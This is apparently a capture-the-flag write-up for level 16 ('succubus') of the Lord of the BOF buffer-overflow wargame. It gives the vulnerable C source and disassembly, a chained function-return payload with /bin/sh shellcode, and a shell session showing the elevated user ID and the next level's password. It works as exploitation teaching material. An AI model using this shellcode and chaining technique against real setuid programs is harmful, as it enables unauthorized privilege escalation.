# Level 16, Zombie-Assassin -> Succubus

### succubus.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - succubus
        - calling functions continuously
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

// the inspector
int check = 0;

void MO(char *cmd)
{
        if(check != 4)
                exit(0);

        printf("welcome to the MO!\n");

        // olleh!
        system(cmd);
}

void YUT(void)
{
        if(check != 3)
                exit(0);

        printf("welcome to the YUT!\n");
        check = 4;
}

void GUL(void)
{
        if(check != 2)
                exit(0);

        printf("welcome to the GUL!\n");
        check = 3;
}

void GYE(void)
{
        if(check != 1)
                exit(0);

        printf("welcome to the GYE!\n");
        check = 2;
}

void DO(void)
{
        printf("welcome to the DO!\n");
        check = 1;
}

main(int argc, char *argv[])
{
        char buffer[40];
        char *addr;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // you cannot use library
        if(strchr(argv[1], '\x40')){
                printf("You cannot use library\n");
                exit(0);
        }

        // check address
        addr = (char *)&DO;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with DO\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // stack destroyer
        // 100 : extra space for copied argv[1]
        memset(buffer, 0, 44);
        memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));

        // LD_* eraser
        // 40 : extra space for memset function
        memset(buffer-3000, 0, 3000-40);
}
```

### Analysis

#### Disassembling the "succubus"

```
Dump of assembler code for function MO:
0x8048724 <MO>: push   %ebp
0x8048725 <MO+1>:       mov    %ebp,%esp
0x8048727 <MO+3>:       cmp    %ds:0x8049a90,4
0x804872e <MO+10>:      je     0x8048740 <MO+28>
0x8048730 <MO+12>:      push   0
0x8048732 <MO+14>:      call   0x804845c <exit>
0x8048737 <MO+19>:      add    %esp,4
0x804873a <MO+22>:      lea    %esi,[%esi]
0x8048740 <MO+28>:      push   0x80489bb
0x8048745 <MO+33>:      call   0x804844c <printf>
0x804874a <MO+38>:      add    %esp,4
0x804874d <MO+41>:      mov    %eax,DWORD PTR [%ebp+8]
0x8048750 <MO+44>:      push   %eax
0x8048751 <MO+45>:      call   0x804840c <system>
0x8048756 <MO+50>:      add    %esp,4
0x8048759 <MO+53>:      leave
0x804875a <MO+54>:      ret

Dump of assembler code for function YUT:
0x804875c <YUT>:        push   %ebp
0x804875d <YUT+1>:      mov    %ebp,%esp
0x804875f <YUT+3>:      cmp    %ds:0x8049a90,3
0x8048766 <YUT+10>:     je     0x8048772 <YUT+22>
0x8048768 <YUT+12>:     push   0
0x804876a <YUT+14>:     call   0x804845c <exit>
0x804876f <YUT+19>:     add    %esp,4
0x8048772 <YUT+22>:     push   0x80489cf
0x8048777 <YUT+27>:     call   0x804844c <printf>
0x804877c <YUT+32>:     add    %esp,4
0x804877f <YUT+35>:     mov    %ds:0x8049a90,0x4
0x8048789 <YUT+45>:     leave
0x804878a <YUT+46>:     ret

Dump of assembler code for function GUL:
0x804878c <GUL>:        push   %ebp
0x804878d <GUL+1>:      mov    %ebp,%esp
0x804878f <GUL+3>:      cmp    %ds:0x8049a90,2
0x8048796 <GUL+10>:     je     0x80487a2 <GUL+22>
0x8048798 <GUL+12>:     push   0
0x804879a <GUL+14>:     call   0x804845c <exit>
0x804879f <GUL+19>:     add    %esp,4
0x80487a2 <GUL+22>:     push   0x80489e4
0x80487a7 <GUL+27>:     call   0x804844c <printf>
0x80487ac <GUL+32>:     add    %esp,4
0x80487af <GUL+35>:     mov    %ds:0x8049a90,0x3
0x80487b9 <GUL+45>:     leave
0x80487ba <GUL+46>:     ret

Dump of assembler code for function GYE:
0x80487bc <GYE>:        push   %ebp
0x80487bd <GYE+1>:      mov    %ebp,%esp
0x80487bf <GYE+3>:      cmp    %ds:0x8049a90,1
0x80487c6 <GYE+10>:     je     0x80487d2 <GYE+22>
0x80487c8 <GYE+12>:     push   0
0x80487ca <GYE+14>:     call   0x804845c <exit>
0x80487cf <GYE+19>:     add    %esp,4
0x80487d2 <GYE+22>:     push   0x80489f9
0x80487d7 <GYE+27>:     call   0x804844c <printf>
0x80487dc <GYE+32>:     add    %esp,4
0x80487df <GYE+35>:     mov    %ds:0x8049a90,0x2
0x80487e9 <GYE+45>:     leave
0x80487ea <GYE+46>:     ret

Dump of assembler code for function DO:
0x80487ec <DO>: push   %ebp
0x80487ed <DO+1>:       mov    %ebp,%esp
0x80487ef <DO+3>:       push   0x8048a0e
0x80487f4 <DO+8>:       call   0x804844c <printf>
0x80487f9 <DO+13>:      add    %esp,4
0x80487fc <DO+16>:      mov    %ds:0x8049a90,0x1
0x8048806 <DO+26>:      leave
0x8048807 <DO+27>:      ret

Dump of assembler code for function main:
0x8048808 <main>:       push   %ebp
0x8048809 <main+1>:     mov    %ebp,%esp
0x804880b <main+3>:     sub    %esp,44
0x804880e <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x8048812 <main+10>:    jg     0x8048830 <main+40>
0x8048814 <main+12>:    push   0x8048a22
0x8048819 <main+17>:    call   0x804844c <printf>
0x804881e <main+22>:    add    %esp,4
0x8048821 <main+25>:    push   0
0x8048823 <main+27>:    call   0x804845c <exit>
0x8048828 <main+32>:    add    %esp,4
0x804882b <main+35>:    nop
0x804882c <main+36>:    lea    %esi,[%esi*1]
0x8048830 <main+40>:    push   64
0x8048832 <main+42>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048835 <main+45>:    add    %eax,4
0x8048838 <main+48>:    mov    %edx,DWORD PTR [%eax]
0x804883a <main+50>:    push   %edx
0x804883b <main+51>:    call   0x80483dc <strchr>
0x8048840 <main+56>:    add    %esp,8
0x8048843 <main+59>:    mov    %eax,%eax
0x8048845 <main+61>:    test   %eax,%eax
0x8048847 <main+63>:    je     0x8048860 <main+88>
0x8048849 <main+65>:    push   0x8048a2e
0x804884e <main+70>:    call   0x804844c <printf>
0x8048853 <main+75>:    add    %esp,4
0x8048856 <main+78>:    push   0
0x8048858 <main+80>:    call   0x804845c <exit>
0x804885d <main+85>:    add    %esp,4
0x8048860 <main+88>:    mov    DWORD PTR [%ebp-44],0x80487ec
0x8048867 <main+95>:    push   4
0x8048869 <main+97>:    lea    %eax,[%ebp-44]
0x804886c <main+100>:   push   %eax
0x804886d <main+101>:   mov    %eax,DWORD PTR [%ebp+12]
0x8048870 <main+104>:   add    %eax,4
0x8048873 <main+107>:   mov    %edx,DWORD PTR [%eax]
0x8048875 <main+109>:   add    %edx,44
0x8048878 <main+112>:   push   %edx
0x8048879 <main+113>:   call   0x804842c <memcmp>
0x804887e <main+118>:   add    %esp,12
0x8048881 <main+121>:   mov    %eax,%eax
0x8048883 <main+123>:   test   %eax,%eax
0x8048885 <main+125>:   je     0x80488a0 <main+152>
0x8048887 <main+127>:   push   0x8048a60
0x804888c <main+132>:   call   0x804844c <printf>
0x8048891 <main+137>:   add    %esp,4
0x8048894 <main+140>:   push   0
0x8048896 <main+142>:   call   0x804845c <exit>
0x804889b <main+147>:   add    %esp,4
0x804889e <main+150>:   mov    %esi,%esi
0x80488a0 <main+152>:   mov    %eax,DWORD PTR [%ebp+12]
0x80488a3 <main+155>:   add    %eax,4
0x80488a6 <main+158>:   mov    %edx,DWORD PTR [%eax]
0x80488a8 <main+160>:   push   %edx
0x80488a9 <main+161>:   lea    %eax,[%ebp-40]
0x80488ac <main+164>:   push   %eax
0x80488ad <main+165>:   call   0x804847c <strcpy>
0x80488b2 <main+170>:   add    %esp,8
0x80488b5 <main+173>:   lea    %eax,[%ebp-40]
0x80488b8 <main+176>:   push   %eax
0x80488b9 <main+177>:   push   0x8048a7f
0x80488be <main+182>:   call   0x804844c <printf>
0x80488c3 <main+187>:   add    %esp,8
0x80488c6 <main+190>:   push   44
0x80488c8 <main+192>:   push   0
0x80488ca <main+194>:   lea    %eax,[%ebp-40]
0x80488cd <main+197>:   push   %eax
0x80488ce <main+198>:   call   0x804846c <memset>
0x80488d3 <main+203>:   add    %esp,12
0x80488d6 <main+206>:   lea    %eax,[%ebp-40]
0x80488d9 <main+209>:   mov    %edx,0xbfffff6b
0x80488de <main+214>:   mov    %ecx,%edx
0x80488e0 <main+216>:   sub    %ecx,%eax
0x80488e2 <main+218>:   mov    %eax,%ecx
0x80488e4 <main+220>:   push   %eax
0x80488e5 <main+221>:   push   0
0x80488e7 <main+223>:   lea    %eax,[%ebp-40]
0x80488ea <main+226>:   lea    %edx,[%eax+148]
0x80488f0 <main+232>:   push   %edx
0x80488f1 <main+233>:   call   0x804846c <memset>
0x80488f6 <main+238>:   add    %esp,12
0x80488f9 <main+241>:   push   0xb90
0x80488fe <main+246>:   push   0
0x8048900 <main+248>:   lea    %eax,[%ebp-40]
0x8048903 <main+251>:   lea    %edx,[%eax-3000]
0x8048909 <main+257>:   push   %edx
0x804890a <main+258>:   call   0x804846c <memset>
0x804890f <main+263>:   add    %esp,12
0x8048912 <main+266>:   leave
0x8048913 <main+267>:   ret
```

#### Estimated Stack Structure

```sh
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]
|  RET                  | [%ebp+4]
|  ARGC                 | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+C]
```

### Exploit

#### How to pwn

```
DO()  : 0x80487ec
GYE() : 0x80487bc
GUL() : 0x804878c
YUT() : 0x804875c
MO()  : 0x8048724
```

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
./succubus `python -c "print 'A'*44+'\xec\x87\x04\x08'+'\xbc\x87\x04\x08'+'\x8c\x87\x04\x08'+'\x5c\x87\x04\x08'+'\x24\x87\x04\x08'+'BBBB'+'\xb8\xfa\xff\xbf'+'/bin/sh'"`
```

### Result

```
[zombie_assassin@localhost zombie_assassin]$ ./succubus `python -c "print 'A'*44+'\xec\x87\x04\x08'+'\xbc\x87\x04\x08'+'\x8c\x87\x04\x08'+'\x5c\x87\x04\x08'+'\x24\x87\x04\x08'+'BBBB'+'\xb8\xfa\xff\xbf'+'/bin/sh'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒\$BBBB▒▒▒▒/bin/sh
welcome to the DO!
welcome to the GYE!
welcome to the GUL!
welcome to the YUT!
welcome to the MO!
bash$ id
uid=516(zombie_assassin) gid=516(zombie_assassin) euid=517(succubus) egid=517(succubus) groups=516(zombie_assassin)
bash$ my-pass
euid = 517
here to stay
```